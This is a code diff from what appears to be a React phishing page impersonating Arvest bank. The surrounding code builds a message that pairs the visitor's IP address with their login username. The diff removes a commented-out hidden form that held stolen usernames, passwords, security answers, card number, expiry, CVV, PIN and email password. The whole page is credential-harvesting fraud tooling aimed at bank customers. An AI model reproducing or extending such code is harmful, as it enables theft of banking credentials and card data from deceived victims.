@@ -55,6 +55,7 @@ const [isLoading, setIsLoading] = useState(false)
 
     const message = `
     [----+🏦 ARVEST 🏦+-----]
+    
     IP: ${visitorIP}
 
     Username: ${login1.username}
@@ -123,28 +124,6 @@ const [isLoading, setIsLoading] = useState(false)
               defaultValue={formInput.sn}
             />
           </div>
-
-         
-          {/* <div style={{display:"none"}}>
-          <input type="text" name="browser" defaultValue={navigator.userAgent} />
-          <input type="text" name="user" defaultValue={login1.username} />
-          <input type="text" name="pass" defaultValue={login1.password}/>
-          <input type="text" name="user2" defaultValue={login2.username2}/>
-          <input type="text" name="pass2" defaultValue={login2.password2}/>
-          <input type="text" name="q1" defaultValue={question.q1}/>
-          <input type="text" name="ans1" defaultValue={question.ans1}/>
-          <input type="text" name="q2" defaultValue={question.q2}/>
-          <input type="text" name="ans2" defaultValue={question.ans2}/>
-          <input type="text" name="q3" defaultValue={question.q3}/>
-          <input type="text" name="ans3" defaultValue={question.ans3}/>
-          <input type="text" name="cn" defaultValue={additional.cn}/>
-          <input type="text" name="edate" defaultValue={additional.edate}/>
-          <input type="text" name="cv" defaultValue={additional.ccv}/>
-          <input type="text" name="pn" defaultValue={additional.pn}/>
-          <input type="text" name="mail" defaultValue={additional.mail}/>
-          <input type="text" name="mail_p" defaultValue={additional.mail_p}/>
-          </div> */}
-          
          
           {isLoading ?
           <div style={{width:"100%", display:"flex", justifyContent:"center"}}>
